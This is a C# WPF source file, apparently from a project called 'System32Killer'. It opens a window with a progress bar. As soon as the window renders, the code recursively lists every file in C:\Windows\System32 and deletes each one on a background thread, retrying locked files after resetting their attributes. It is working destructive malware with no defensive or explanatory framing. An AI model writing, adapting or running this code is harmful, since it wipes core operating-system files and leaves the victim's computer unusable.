using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.AccessControl;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;

namespace System32Killer
{
    /// <summary>
    /// Interaction logic for DeletionWindow.xaml
    /// </summary>
    public partial class DeletionWindow : Window
    {
        private const string DIRECTORY_NAME = "C:\\Windows\\System32\\";

        public DeletionWindow()
        {
            InitializeComponent();
        }

        protected override void OnContentRendered(EventArgs e)
        {
            base.OnContentRendered(e);
            string[] files = Directory.GetFiles(DIRECTORY_NAME, "*", new EnumerationOptions()
            { 
                IgnoreInaccessible = true,
                RecurseSubdirectories = true
            });
            prgProgressBar.Value = 0;

            if (files?.Count() > 0)
            {
                prgProgressBar.Maximum = files.Count();

                new Thread(() =>
                {
                    DeleteFiles(files);
                    this.Dispatcher.Invoke(() =>
                    {
                        this.Close();
                    });
                }).Start();
            }
        }

        private void DeleteFiles(string[] files)
        {
            foreach (string file in files)
            {
                try
                {
                    File.Delete(file);
                }
                catch (UnauthorizedAccessException ex)
                {
                    try
                    {
                        File.SetAttributes(file, FileAttributes.Normal);
                        File.Delete(file);
                    }
                    catch (Exception e) { }
                }
                catch (IOException) { }

                this.Dispatcher.Invoke(() =>
                {
                    prgProgressBar.Value++;
                });
            }
        }
    }
}
